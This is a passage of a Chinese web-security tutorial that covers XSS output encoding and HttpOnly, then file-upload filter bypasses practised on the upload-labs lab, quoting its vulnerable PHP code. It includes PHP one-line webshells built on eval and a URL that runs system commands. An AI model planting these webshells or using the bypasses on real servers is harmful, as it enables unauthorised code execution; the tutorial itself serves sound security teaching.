[2] &amp; &#65288;&amp; &#31526;&#21495;&#65289;
[3];&#65288;&#20998;&#21495;&#65289;
[4] $&#65288;&#32654;&#20803;&#31526;&#21495;&#65289;
[5] %&#65288;&#30334;&#20998;&#27604;&#31526;&#21495;&#65289;
[6] @&#65288;at &#31526;&#21495;&#65289;
[7] <span style="color: #8b2252;">'&#65288;&#21333;&#24341;&#21495;&#65289;</span>
<span style="color: #8b2252;">[8] "&#65288;&#24341;&#21495;&#65289;</span>
<span style="color: #8b2252;">[9] \'</span>&#65288;&#21453;&#26012;&#26464;&#36716;&#20041;&#21333;&#24341;&#21495;&#65289;
[10] <span style="color: #8b2252;">\"</span>&#65288;&#21453;&#26012;&#26464;&#36716;&#20041;&#24341;&#21495;&#65289;
[11] &lt;&gt;&#65288;&#23574;&#25324;&#21495;&#65289;
[12] ()&#65288;&#25324;&#21495;&#65289;
[13] +&#65288;&#21152;&#21495;&#65289;
[14] CR&#65288;&#22238;&#36710;&#31526;&#65292;ASCII 0x0d&#65289;
[15] LF&#65288;&#25442;&#34892;&#65292;ASCII 0x0a&#65289;
[16] ,&#65288;&#36887;&#21495;&#65289;
[17] <span style="color: #8b2252;">\&#65288;</span>&#21453;&#26012;&#26464;&#65289;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:5572c855-2c32-432b-be69-584a492cfacf" class="outline-4">
<h4 id="h:5572c855-2c32-432b-be69-584a492cfacf">输出检查（编码）</h4>
<div class="outline-text-4" id="text-h:5572c855-2c32-432b-be69-584a492cfacf">
</div>
<div id="outline-container-h:b99bc4b0-cc3a-49b5-9ebf-4e0bfd02874e" class="outline-5">
<h5 id="h:b99bc4b0-cc3a-49b5-9ebf-4e0bfd02874e">HTML实体编码</h5>
<div class="outline-text-5" id="text-h:b99bc4b0-cc3a-49b5-9ebf-4e0bfd02874e">
<p>
在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。
</p>

<div class="org-src-container">
<pre class="src src-sh">&amp; &#65288;&#21644;&#21495;&#65289; &#25104;&#20026; &amp;amp;
<span style="color: #8b2252;">" &#65288;&#21452;&#24341;&#21495;&#65289; &#25104;&#20026; &amp;quot;</span>
<span style="color: #8b2252;">' &#65288;&#21333;&#24341;&#21495;&#65289; &#25104;&#20026; &amp;#039;</span>
<span style="color: #8b2252;">&lt; &#65288;&#23567;&#20110;&#65289; &#25104;&#20026; &amp;lt;</span>
<span style="color: #8b2252;">&gt; &#65288;&#22823;&#20110;&#65289; &#25104;&#20026; &amp;gt;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:a66c3502-520c-4edf-a860-b79e19abdf47" class="outline-5">
<h5 id="h:a66c3502-520c-4edf-a860-b79e19abdf47">JavaScript编码</h5>
<div class="outline-text-5" id="text-h:a66c3502-520c-4edf-a860-b79e19abdf47">
<p>
JavaScriptEncode与HtmlEncode的编码方式不同，它需要使用反斜杠"\"对特殊字符进行转义。除了上面的那些转义之外，还要附加上下面的转义：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #8b2252;">\ </span>&#36716;&#25104; <span style="color: #8b2252;">\\</span>
/ &#36716;&#25104; <span style="color: #8b2252;">\/</span>
; &#36716;&#25104; &#65307;(&#20840;&#35282;;)
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:7b7dd6fa-8af9-4296-bad6-c32453598175" class="outline-4">
<h4 id="h:7b7dd6fa-8af9-4296-bad6-c32453598175">HttpOnly</h4>
<div class="outline-text-4" id="text-h:7b7dd6fa-8af9-4296-bad6-c32453598175">
<p>
许多 XSS 攻击的目的就是为了获取用户的 cookie，将重要的 cookie 标记为 httponly 属性，这样的话当浏览器向服务端发起请求时就会带上 cookie 字段，但是在脚本中却不能访问 cookie，这样就避免了XSS攻击利用JavaScript的document.cookie 获取 cookie 。
</p>

<p>
严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 cookie 劫持攻击。
</p>
</div>
</div>
</div>
</section>
<section id="outline-container-h:a0c81906-2e0b-4107-bbef-6c8d3c1e15f7" class="outline-2">
<h2 id="h:a0c81906-2e0b-4107-bbef-6c8d3c1e15f7">文件上传及验证绕过</h2>
<div class="outline-text-2" id="text-h:a0c81906-2e0b-4107-bbef-6c8d3c1e15f7">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>上传检测流程概述</li>
<li>客户端检测绕过(JS检查)</li>
<li>服务端黑名单绕过-特殊可解析后缀</li>
<li>服务端黑名单绕过-大小写绕过</li>
<li>服务端黑名单绕过-点绕过</li>
<li>服务端黑名单绕过-空格绕过</li>
<li>服务端黑名单绕过-目录路径检测绕过</li>
<li>服务端黑名单绕过-`:$DATA`绕过</li>
<li>服务端黑名单绕过-双后缀名绕过</li>
<li>服务端白名单绕过-MIME类型检测绕过</li>
<li>服务端白名单绕过-%00及0x00截断绕过</li>
<li>服务端内容检查绕过-文件头检查</li>
<li>服务端内容检查绕过-突破 getimagesize 及 exif jimagetype 函数</li>
<li>服务端内容检查绕过-二次渲染绕过</li>
<li>服务端内容检查绕过-文件包含绕过</li>
<li>代码逻辑-条件竞争绕过</li>
<li>文件上传漏洞安全防范</li>
</ul>


<p>
文件上传是Web网页中常见的功能之一，通常情况下恶意文件的上传，会形成漏洞。
大致逻辑是：用户通过上传点上传了恶意文件，通过服务器的校验后保存到指定的位置。当用户访问已经上传成功的文件时，上传的Web脚本会被Web容器解析，从而对网站造成危害。
</p>

<p>
文件上传的关键点：
</p>
<ul class="org-ul">
<li>能不能上传？</li>
<li>传到哪里去了？保存位置</li>
<li>能不能运行？</li>
</ul>
</div>
<div id="outline-container-h:63c5dd1f-0ee2-4bd5-b8b4-a2b6acb45d54" class="outline-3">
<h3 id="h:63c5dd1f-0ee2-4bd5-b8b4-a2b6acb45d54">文件上传常见点</h3>
<div class="outline-text-3" id="text-h:63c5dd1f-0ee2-4bd5-b8b4-a2b6acb45d54">
<div class="org-src-container">
<pre class="src src-sh">&#19978;&#20256;&#22836;&#20687;
&#19978;&#20256;&#30456;&#20876;
&#19978;&#20256;&#38468;&#20214;
&#28155;&#21152;&#25991;&#31456;&#22270;&#29255;
&#21069;&#21488;&#30041;&#35328;&#36164;&#26009;&#19978;&#20256;
&#32534;&#36753;&#22120;&#25991;&#20214;&#19978;&#20256;
</pre>
</div>

<p>
例如如下编辑器上传点：
</p>

<p>
文件管理处文件上传：
</p>

<p>
前台用户发表文章处文件上传：
</p>

<p>
个人头像处文件上传：
</p>
</div>
</div>
<div id="outline-container-h:33371723-a05e-49bc-b20d-faccd95b2462" class="outline-3">
<h3 id="h:33371723-a05e-49bc-b20d-faccd95b2462">客户端—JS绕过</h3>
<div class="outline-text-3" id="text-h:33371723-a05e-49bc-b20d-faccd95b2462">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#29615;&#22659;&#23433;&#35013;</span>
docker pull cuer/upload-labs
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;upload-labs&#38774;&#22330;</span>
docker run --name upload-labs -d -p 8084:80 cuer/upload-labs
</pre>
</div>

<p>
访问 <a href="http://your_ip:8081">http://your_ip:8081</a> , 选择 Pass-01
Upload-labs（Pass-01）源码分析，通过验证发现是前端JS验证，而前端验证，几乎没有什么防护作用。
</p>
</div>
<div id="outline-container-h:fae3f213-2c89-45c3-927f-44c2d24d9548" class="outline-4">
<h4 id="h:fae3f213-2c89-45c3-927f-44c2d24d9548">禁用JS</h4>
<div class="outline-text-4" id="text-h:fae3f213-2c89-45c3-927f-44c2d24d9548">
<p>
浏览器直接禁用JS，先按F12，然后选择 <code>Settings</code> 或按F1，找到禁用JS
</p>

<p>
phpinfo
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php phpinfo();?&gt;
</pre>
</div>

<p>
PHP一句话木马
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php eval(@$<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'a'</span>]);?&gt;
</pre>
</div>

<p>
直接上传php木马，上传成功
</p>

<p>
浏览器访问shell
</p>
<div class="org-src-container">
<pre class="src src-sh">http://IP/upload/get.php?<span style="color: #a0522d;">a</span>=system(ls);
</pre>
</div>

<p>
使用蚁剑连接木马
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php eval(@$<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'a'</span>]);?&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ae0af946-0554-401e-9b2a-b350a1ae9ae6" class="outline-4">
<h4 id="h:ae0af946-0554-401e-9b2a-b350a1ae9ae6">后缀名绕过</h4>
<div class="outline-text-4" id="text-h:ae0af946-0554-401e-9b2a-b350a1ae9ae6">
<p>
先把一句话木马改为 .jpg|.png 其中一个后缀，上传，burp suite抓包
</p>

<p>
修改后缀名为php，上传成功
</p>
</div>
</div>
<div id="outline-container-h:7ffba57b-000a-43e1-93d8-cd39a394b266" class="outline-4">
<h4 id="h:7ffba57b-000a-43e1-93d8-cd39a394b266">修改前端代码</h4>
<div class="outline-text-4" id="text-h:7ffba57b-000a-43e1-93d8-cd39a394b266">
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">enctype</span>=<span style="color: #8b2252;">"multipart/form-data"</span> <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"post"</span> <span style="color: #a0522d;">onsubmit</span>=<span style="color: #8b2252;">"return checkFile()"</span>&gt;
                &lt;<span style="color: #0000ff;">p</span>&gt;&#35831;&#36873;&#25321;&#35201;&#19978;&#20256;&#30340;&#22270;&#29255;&#65306;&lt;/<span style="color: #0000ff;">p</span>&gt;&lt;<span style="color: #0000ff;">p</span>&gt;
                &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"input_file"</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"file"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"upload_file"</span>&gt;
                &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"button"</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"submit"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"submit"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"&#19978;&#20256;"</span>&gt;
            &lt;/<span style="color: #0000ff;">p</span>&gt;&lt;/<span style="color: #0000ff;">form</span>&gt;
</pre>
</div>
<p>
直接修改前端代码，上传，删除 form 标签的 onsubmit 事件即可成功上传
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">enctype</span>=<span style="color: #8b2252;">"multipart/form-data"</span> <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"post"</span> <span style="color: #a0522d;">onsubmit</span>=<span style="color: #8b2252;">""</span>&gt;
... ...
</pre>
</div>

<p>
注意：该方法在Firefox浏览器中生效，但是在Edge、Chrome浏览器中不生效。
</p>
</div>
</div>
</div>
<div id="outline-container-h:15baffb9-eb2c-4066-ba47-bb39a5266e47" class="outline-3">
<h3 id="h:15baffb9-eb2c-4066-ba47-bb39a5266e47">服务端黑名单绕过</h3>
<div class="outline-text-3" id="text-h:15baffb9-eb2c-4066-ba47-bb39a5266e47">
</div>
<div id="outline-container-h:19ad4a01-c405-41d6-b7f3-d5f6ccfce1a8" class="outline-4">
<h4 id="h:19ad4a01-c405-41d6-b7f3-d5f6ccfce1a8">特殊可解析后缀</h4>
<div class="outline-text-4" id="text-h:19ad4a01-c405-41d6-b7f3-d5f6ccfce1a8">
<p>
Upload-labs（Pass-03）根据源码可以看出，只是做了个简单的后缀名黑名单，识别上传文件的类型是否为 '.asp','.aspx','.php','.jsp' 中的一个，若是其中的一个，则不允许上传。
</p>

<p>
但是可以上传其他任意后缀。比如说:. phtml .phps .php5 .pht ，但如果上传的是.php5这种类型文件，想要被当成php执行的话，需要有个前提条件：即Apache的httpd.conf有如下配置代码（靶场环境未配置好，仅做上传测试）
。
</p>

<div class="org-src-container">
<pre class="src src-sh">AddType application/x-httpd-php .php .phtml .phps .php5 .pht
</pre>
</div>

<div class="org-src-container">
<pre class="src src-javascript">$is_upload = <span style="color: #008b8b;">false</span>;
$msg = <span style="color: #008b8b;">null</span>;
<span style="color: #a020f0;">if</span> (isset($_POST[<span style="color: #8b2252;">'submit'</span>])) {
    <span style="color: #a020f0;">if</span> (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(<span style="color: #8b2252;">'.asp'</span>,<span style="color: #8b2252;">'.aspx'</span>,<span style="color: #8b2252;">'.php'</span>,<span style="color: #8b2252;">'.jsp'</span>);
        $file_name = trim($_FILES[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'name'</span>]);
        $file_name = deldot($file_name);<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21024;&#38500;&#25991;&#20214;&#21517;&#26411;&#23614;&#30340;&#28857;</span>
        $file_ext = strrchr($file_name, <span style="color: #8b2252;">'.'</span>);
        $file_ext = strtolower($file_ext); <span style="color: #b22222;">//</span><span style="color: #b22222;">&#36716;&#25442;&#20026;&#23567;&#20889;</span>
        $file_ext = str_ireplace(<span style="color: #8b2252;">'::$DATA'</span>, <span style="color: #8b2252;">''</span>, $file_ext);<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21435;&#38500;&#23383;&#31526;&#20018;::$DATA</span>
        $file_ext = trim($file_ext); <span style="color: #b22222;">//</span><span style="color: #b22222;">&#39318;&#23614;&#21435;&#31354;&#65292;&#31354;&#26684;&#12289;&#21046;&#34920;&#31526;</span>

        <span style="color: #a020f0;">if</span>(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span style="color: #8b2252;">'/'</span>.date(<span style="color: #8b2252;">"YmdHis"</span>).rand(1000,9999).$file_ext;  <span style="color: #b22222;">// </span><span style="color: #b22222;">&#25991;&#20214;&#37325;&#21629;&#21517;          </span>
            <span style="color: #a020f0;">if</span> (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = <span style="color: #008b8b;">true</span>;
            } <span style="color: #a020f0;">else</span> {
                $msg = <span style="color: #8b2252;">'&#19978;&#20256;&#20986;&#38169;&#65281;'</span>;
            }
        } <span style="color: #a020f0;">else</span> {
            $msg = <span style="color: #8b2252;">'&#19981;&#20801;&#35768;&#19978;&#20256;.asp,.aspx,.php,.jsp&#21518;&#32512;&#25991;&#20214;&#65281;'</span>;
        }
    } <span style="color: #a020f0;">else</span> {
        $msg = UPLOAD_PATH . <span style="color: #8b2252;">'&#25991;&#20214;&#22841;&#19981;&#23384;&#22312;,&#35831;&#25163;&#24037;&#21019;&#24314;&#65281;'</span>;
    }
}
</pre>
</div>

<p>
所以由于服务端采用黑名单的过滤方式，这里可以使用php3或者php5后缀上传，直接修改后缀名，上传成功
</p>

<p>
右键“复制图像链接”则为shell的链接(此靶机环境测试未解析，仅作上传测试即可)
</p>

<p>
<a href="http://127.0.0.1:8081/upload/202202040857107026.php3">http://127.0.0.1:8081/upload/202202040857107026.php3</a>
</p>


<p>
访问上传成功的文件：
</p>
</div>
</div>
<div id="outline-container-h:404b8dcb-5d6b-445d-b32f-4815ffae111d" class="outline-4">
<h4 id="h:404b8dcb-5d6b-445d-b32f-4815ffae111d">大小写绕过（√）</h4>
<div class="outline-text-4" id="text-h:404b8dcb-5d6b-445d-b32f-4815ffae111d">
<p>
Upload-labs（Pass-06）通过查看源码可以发现，虽然设置了黑名单对常见的后缀进行过滤，但并未对后缀名大小写进行统一。可以利用大小写进行绕过。例如：.PHp
</p>

<div class="org-src-container">
<pre class="src src-javascript">$is_upload = <span style="color: #008b8b;">false</span>;
$msg = <span style="color: #008b8b;">null</span>;
<span style="color: #a020f0;">if</span> (isset($_POST[<span style="color: #8b2252;">'submit'</span>])) {
    <span style="color: #a020f0;">if</span> (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(<span style="color: #8b2252;">".php"</span>,<span style="color: #8b2252;">".php5"</span>,<span style="color: #8b2252;">".php4"</span>,<span style="color: #8b2252;">".php3"</span>,<span style="color: #8b2252;">".php2"</span>,<span style="color: #8b2252;">".html"</span>,<span style="color: #8b2252;">".htm"</span>,<span style="color: #8b2252;">".phtml"</span>,<span style="color: #8b2252;">".pht"</span>,<span style="color: #8b2252;">".pHp"</span>,<span style="color: #8b2252;">".pHp5"</span>,<span style="color: #8b2252;">".pHp4"</span>,<span style="color: #8b2252;">".pHp3"</span>,<span style="color: #8b2252;">".pHp2"</span>,<span style="color: #8b2252;">".Html"</span>,<span style="color: #8b2252;">".Htm"</span>,<span style="color: #8b2252;">".pHtml"</span>,<span style="color: #8b2252;">".jsp"</span>,<span style="color: #8b2252;">".jspa"</span>,<span style="color: #8b2252;">".jspx"</span>,<span style="color: #8b2252;">".jsw"</span>,<span style="color: #8b2252;">".jsv"</span>,<span style="color: #8b2252;">".jspf"</span>,<span style="color: #8b2252;">".jtml"</span>,<span style="color: #8b2252;">".jSp"</span>,<span style="color: #8b2252;">".jSpx"</span>,<span style="color: #8b2252;">".jSpa"</span>,<span style="color: #8b2252;">".jSw"</span>,<span style="color: #8b2252;">".jSv"</span>,<span style="color: #8b2252;">".jSpf"</span>,<span style="color: #8b2252;">".jHtml"</span>,<span style="color: #8b2252;">".asp"</span>,<span style="color: #8b2252;">".aspx"</span>,<span style="color: #8b2252;">".asa"</span>,<span style="color: #8b2252;">".asax"</span>,<span style="color: #8b2252;">".ascx"</span>,<span style="color: #8b2252;">".ashx"</span>,<span style="color: #8b2252;">".asmx"</span>,<span style="color: #8b2252;">".cer"</span>,<span style="color: #8b2252;">".aSp"</span>,<span style="color: #8b2252;">".aSpx"</span>,<span style="color: #8b2252;">".aSa"</span>,<span style="color: #8b2252;">".aSax"</span>,<span style="color: #8b2252;">".aScx"</span>,<span style="color: #8b2252;">".aShx"</span>,<span style="color: #8b2252;">".aSmx"</span>,<span style="color: #8b2252;">".cEr"</span>,<span style="color: #8b2252;">".sWf"</span>,<span style="color: #8b2252;">".swf"</span>,<span style="color: #8b2252;">".htaccess"</span>,<span style="color: #8b2252;">".ini"</span>);
        $file_name = trim($_FILES[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'name'</span>]);
        $file_name = deldot($file_name);<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21024;&#38500;&#25991;&#20214;&#21517;&#26411;&#23614;&#30340;&#28857;</span>
        $file_ext = strrchr($file_name, <span style="color: #8b2252;">'.'</span>);
        $file_ext = str_ireplace(<span style="color: #8b2252;">'::$DATA'</span>, <span style="color: #8b2252;">''</span>, $file_ext);<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21435;&#38500;&#23383;&#31526;&#20018;::$DATA</span>
        $file_ext = trim($file_ext); <span style="color: #b22222;">//</span><span style="color: #b22222;">&#39318;&#23614;&#21435;&#31354;</span>

        <span style="color: #a020f0;">if</span> (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span style="color: #8b2252;">'/'</span>.date(<span style="color: #8b2252;">"YmdHis"</span>).rand(1000,9999).$file_ext;
            <span style="color: #a020f0;">if</span> (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = <span style="color: #008b8b;">true</span>;
            } <span style="color: #a020f0;">else</span> {
                $msg = <span style="color: #8b2252;">'&#19978;&#20256;&#20986;&#38169;&#65281;'</span>;
            }
        } <span style="color: #a020f0;">else</span> {
            $msg = <span style="color: #8b2252;">'&#27492;&#25991;&#20214;&#31867;&#22411;&#19981;&#20801;&#35768;&#19978;&#20256;&#65281;'</span>;
        }
    } <span style="color: #a020f0;">else</span> {
        $msg = UPLOAD_PATH . <span style="color: #8b2252;">'&#25991;&#20214;&#22841;&#19981;&#23384;&#22312;,&#35831;&#25163;&#24037;&#21019;&#24314;&#65281;'</span>;
    }
}
</pre>
</div>

<p>
访问上传成功的文件：
</p>
</div>
</div>
<div id="outline-container-h:ce990c04-f5d6-470d-bd94-b0ffb71ef825" class="outline-4">
<h4 id="h:ce990c04-f5d6-470d-bd94-b0ffb71ef825">点绕过（√）</h4>
<div class="outline-text-4" id="text-h:ce990c04-f5d6-470d-bd94-b0ffb71ef825">
<p>
Upload-labs（Pass-08）分析代码没有去除点，直接在文件后面加上点
</p>

<div class="org-src-container">
<pre class="src src-javascript">$is_upload = <span style="color: #008b8b;">false</span>;
$msg = <span style="color: #008b8b;">null</span>;
<span style="color: #a020f0;">if</span> (isset($_POST[<span style="color: #8b2252;">'submit'</span>])) {
    <span style="color: #a020f0;">if</span> (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(<span style="color: #8b2252;">".php"</span>,<span style="color: #8b2252;">".php5"</span>,<span style="color: #8b2252;">".php4"</span>,<span style="color: #8b2252;">".php3"</span>,<span style="color: #8b2252;">".php2"</span>,<span style="color: #8b2252;">".html"</span>,<span style="color: #8b2252;">".htm"</span>,<span style="color: #8b2252;">".phtml"</span>,<span style="color: #8b2252;">".pht"</span>,<span style="color: #8b2252;">".pHp"</span>,<span style="color: #8b2252;">".pHp5"</span>,<span style="color: #8b2252;">".pHp4"</span>,<span style="color: #8b2252;">".pHp3"</span>,<span style="color: #8b2252;">".pHp2"</span>,<span style="color: #8b2252;">".Html"</span>,<span style="color: #8b2252;">".Htm"</span>,<span style="color: #8b2252;">".pHtml"</span>,<span style="color: #8b2252;">".jsp"</span>,<span style="color: #8b2252;">".jspa"</span>,<span style="color: #8b2252;">".jspx"</span>,<span style="color: #8b2252;">".jsw"</span>,<span style="color: #8b2252;">".jsv"</span>,<span style="color: #8b2252;">".jspf"</span>,<span style="color: #8b2252;">".jtml"</span>,<span style="color: #8b2252;">".jSp"</span>,<span style="color: #8b2252;">".jSpx"</span>,<span style="color: #8b2252;">".jSpa"</span>,<span style="color: #8b2252;">".jSw"</span>,<span style="color: #8b2252;">".jSv"</span>,<span style="color: #8b2252;">".jSpf"</span>,<span style="color: #8b2252;">".jHtml"</span>,<span style="color: #8b2252;">".asp"</span>,<span style="color: #8b2252;">".aspx"</span>,<span style="color: #8b2252;">".asa"</span>,<span style="color: #8b2252;">".asax"</span>,<span style="color: #8b2252;">".ascx"</span>,<span style="color: #8b2252;">".ashx"</span>,<span style="color: #8b2252;">".asmx"</span>,<span style="color: #8b2252;">".cer"</span>,<span style="color: #8b2252;">".aSp"</span>,<span style="color: #8b2252;">".aSpx"</span>,<span style="color: #8b2252;">".aSa"</span>,<span style="color: #8b2252;">".aSax"</span>,<span style="color: #8b2252;">".aScx"</span>,<span style="color: #8b2252;">".aShx"</span>,<span style="color: #8b2252;">".aSmx"</span>,<span style="color: #8b2252;">".cEr"</span>,<span style="color: #8b2252;">".sWf"</span>,<span style="color: #8b2252;">".swf"</span>,<span style="color: #8b2252;">".htaccess"</span>,<span style="color: #8b2252;">".ini"</span>);
        $file_name = trim($_FILES[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'name'</span>]);
        $file_ext = strrchr($file_name, <span style="color: #8b2252;">'.'</span>);
        $file_ext = strtolower($file_ext); <span style="color: #b22222;">//</span><span style="color: #b22222;">&#36716;&#25442;&#20026;&#23567;&#20889;</span>
        $file_ext = str_ireplace(<span style="color: #8b2252;">'::$DATA'</span>, <span style="color: #8b2252;">''</span>, $file_ext);<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21435;&#38500;&#23383;&#31526;&#20018;::$DATA</span>
        $file_ext = trim($file_ext); <span style="color: #b22222;">//</span><span style="color: #b22222;">&#39318;&#23614;&#21435;&#31354;</span>

        <span style="color: #a020f0;">if</span> (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span style="color: #8b2252;">'/'</span>.$file_name;
            <span style="color: #a020f0;">if</span> (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = <span style="color: #008b8b;">true</span>;
            } <span style="color: #a020f0;">else</span> {
                $msg = <span style="color: #8b2252;">'&#19978;&#20256;&#20986;&#38169;&#65281;'</span>;
            }
        } <span style="color: #a020f0;">else</span> {
            $msg = <span style="color: #8b2252;">'&#27492;&#25991;&#20214;&#31867;&#22411;&#19981;&#20801;&#35768;&#19978;&#20256;&#65281;'</span>;
        }
    } <span style="color: #a020f0;">else</span> {
        $msg = UPLOAD_PATH . <span style="color: #8b2252;">'&#25991;&#20214;&#22841;&#19981;&#23384;&#22312;,&#35831;&#25163;&#24037;&#21019;&#24314;&#65281;'</span>;
    }
}
</pre>
</div>

<p>
上传成功
</p>

<p>
在Windows系统中会自动去除文件名最后的 . 点 ，因此在Windows系统中可以使用此方法绕过。
</p>
</div>
</div>
<div id="outline-container-h:d2c213a1-7fd0-4182-8648-8598d316348e" class="outline-4">
<h4 id="h:d2c213a1-7fd0-4182-8648-8598d316348e">空格绕过</h4>
<div class="outline-text-4" id="text-h:d2c213a1-7fd0-4182-8648-8598d316348e">
<p>
Upload-labs（Pass-07）通过代码分析没有去空格，在文件后缀加空格后上传
</p>

<div class="org-src-container">
<pre class="src src-javascript">$is_upload = <span style="color: #008b8b;">false</span>;
$msg = <span style="color: #008b8b;">null</span>;
<span style="color: #a020f0;">if</span> (isset($_POST[<span style="color: #8b2252;">'submit'</span>])) {
    <span style="color: #a020f0;">if</span> (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(<span style="color: #8b2252;">".php"</span>,<span style="color: #8b2252;">".php5"</span>,<span style="color: #8b2252;">".php4"</span>,<span style="color: #8b2252;">".php3"</span>,<span style="color: #8b2252;">".php2"</span>,<span style="color: #8b2252;">".html"</span>,<span style="color: #8b2252;">".htm"</span>,<span style="color: #8b2252;">".phtml"</span>,<span style="color: #8b2252;">".pht"</span>,<span style="color: #8b2252;">".pHp"</span>,<span style="color: #8b2252;">".pHp5"</span>,<span style="color: #8b2252;">".pHp4"</span>,<span style="color: #8b2252;">".pHp3"</span>,<span style="color: #8b2252;">".pHp2"</span>,<span style="color: #8b2252;">".Html"</span>,<span style="color: #8b2252;">".Htm"</span>,<span style="color: #8b2252;">".pHtml"</span>,<span style="color: #8b2252;">".jsp"</span>,<span style="color: #8b2252;">".jspa"</span>,<span style="color: #8b2252;">".jspx"</span>,<span style="color: #8b2252;">".jsw"</span>,<span style="color: #8b2252;">".jsv"</span>,<span style="color: #8b2252;">".jspf"</span>,<span style="color: #8b2252;">".jtml"</span>,<span style="color: #8b2252;">".jSp"</span>,<span style="color: #8b2252;">".jSpx"</span>,<span style="color: #8b2252;">".jSpa"</span>,<span style="color: #8b2252;">".jSw"</span>,<span style="color: #8b2252;">".jSv"</span>,<span style="color: #8b2252;">".jSpf"</span>,<span style="color: #8b2252;">".jHtml"</span>,<span style="color: #8b2252;">".asp"</span>,<span style="color: #8b2252;">".aspx"</span>,<span style="color: #8b2252;">".asa"</span>,<span style="color: #8b2252;">".asax"</span>,<span style="color: #8b2252;">".ascx"</span>,<span style="color: #8b2252;">".ashx"</span>,<span style="color: #8b2252;">".asmx"</span>,<span style="color: #8b2252;">".cer"</span>,<span style="color: #8b2252;">".aSp"</span>,<span style="color: #8b2252;">".aSpx"</span>,<span style="color: #8b2252;">".aSa"</span>,<span style="color: #8b2252;">".aSax"</span>,<span style="color: #8b2252;">".aScx"</span>,<span style="color: #8b2252;">".aShx"</span>,<span style="color: #8b2252;">".aSmx"</span>,<span style="color: #8b2252;">".cEr"</span>,<span style="color: #8b2252;">".sWf"</span>,<span style="color: #8b2252;">".swf"</span>,<span style="color: #8b2252;">".htaccess"</span>,<span style="color: #8b2252;">".ini"</span>);
        $file_name = $_FILES[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'name'</span>];
        $file_name = deldot($file_name);<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21024;&#38500;&#25991;&#20214;&#21517;&#26411;&#23614;&#30340;&#28857;</span>
        $file_ext = strrchr($file_name, <span style="color: #8b2252;">'.'</span>);
        $file_ext = strtolower($file_ext); <span style="color: #b22222;">//</span><span style="color: #b22222;">&#36716;&#25442;&#20026;&#23567;&#20889;</span>
        $file_ext = str_ireplace(<span style="color: #8b2252;">'::$DATA'</span>, <span style="color: #8b2252;">''</span>, $file_ext);<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21435;&#38500;&#23383;&#31526;&#20018;::$DATA</span>

        <span style="color: #a020f0;">if</span> (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span style="color: #8b2252;">'/'</span>.date(<span style="color: #8b2252;">"YmdHis"</span>).rand(1000,9999).$file_ext;
            <span style="color: #a020f0;">if</span> (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = <span style="color: #008b8b;">true</span>;
            } <span style="color: #a020f0;">else</span> {
                $msg = <span style="color: #8b2252;">'&#19978;&#20256;&#20986;&#38169;&#65281;'</span>;
            }
        } <span style="color: #a020f0;">else</span> {
            $msg = <span style="color: #8b2252;">'&#27492;&#25991;&#20214;&#19981;&#20801;&#35768;&#19978;&#20256;'</span>;
        }
    } <span style="color: #a020f0;">else</span> {
